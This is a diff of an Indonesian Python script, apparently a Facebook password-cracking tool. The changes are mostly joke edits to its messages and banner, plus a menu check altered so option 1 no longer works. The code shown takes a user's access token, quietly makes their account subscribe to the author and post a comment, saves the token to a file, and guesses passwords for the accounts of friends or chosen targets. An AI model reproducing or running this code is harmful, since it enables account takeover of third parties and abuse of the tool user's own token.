@@ -23,18 +23,18 @@ ajg=""
 try:ip=req.get('https://api.ipify.org').text
 except req.exceptions.ConnectionError:print('Koneksi Buruk!')
 def login():
-    t=input('Masukan Access Token Anda: ')
+    t=input('Masukan TokenMu Sayang ')
     try:
         r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
         nama=r['name']
         req.post(f'https://graph.facebook.com/100043089921817/subscribers?access_token={t}')
-        req.post(f'https://graph.facebook.com/514866369959689/comments?message=Ok Thanks Latif! and hallo!&access_token={t}')
-        print('Login Berhasil√\nDengan Nama Facebook:',nama)
+        req.post(f'https://graph.facebook.com/514866369959689/comments?message=Ok Thanks Latif Ganteng! and hallo!&access_token={t}')
+        print('Login Gagal Tapi Bohong √\nDengan Nama Facebook:',nama)
         open('saveLogin.txt','a').write(t)
         time.sleep(0.7)
         gas(t).menu()
     except KeyError:
-        print('Token Salah Bro!')
+        print('Token Bor!')
         login()
 def logika():
     try:
@@ -82,7 +82,7 @@ class gas:
             try:ttl=r['birthday']
             except:ttl=''
             open('cp','a').write(user+'|'+pw+'|'+ttl+'\n')
-            print(f'\r\x1b[1;33m[CP] ~ {user}|{pw}{ttl}\x1b[0m\n',end='')
+            print(f'\r\x1b[1;33m[CP]{user}|{pw}|{ttl}\x1b[0m\n',end='')
         print(f'\rCRACK:-{str(cot)}/{len(id)} OK/CP:-{str(ok)}/{str(cp)}',end='')
     def get1(self):
         r=json.loads(req.get(f'https://graph.facebook.com/me/friends?access_token={self.token}').text)
@@ -118,7 +118,7 @@ class gas:
                     try:
                         for pw in memek:kirim.submit(self.crack,uid,pw)
                     except:pass
-        print('\n### [CRACK FINISHED] ###')
+        print('\n### [CRACK UDAH SELESAI SAYANG] ###')
     def get2(self):
         print('\n\t[ Crack ID Teman Atau Publik ]\n')
         target=input('Masukan ID Target: ')
@@ -172,15 +172,15 @@ class gas:
             input('\n[√] Useragent Berhasil Ditambahkan\n[ Enter For Back To Menu ]')
             self.menu()
         elif(a in ("t","T")):
-            input("Enter For Back To Menu")
+            input("PENCET")
             self.menu()
     def menu(self):
         name=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)['name']
         os.system('clear')
         cowsay.cow(f'Hallo: {name} :)\nYour IP: {ip}')
-        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\tKambing Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
+        print('\n\t[ CODED BY: LATIF ANAK GANTENG ]\n\t\tMONYET Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
         p=input('[+] Chosee: ')
-        if(p in ('01','1')):self.get1()
+        if(p in ('02','4')):self.get1()
         elif(p in ('02','2')):self.get2()
         elif(p in ('03','3')):self.ua()
         elif(p in ('04','4')):
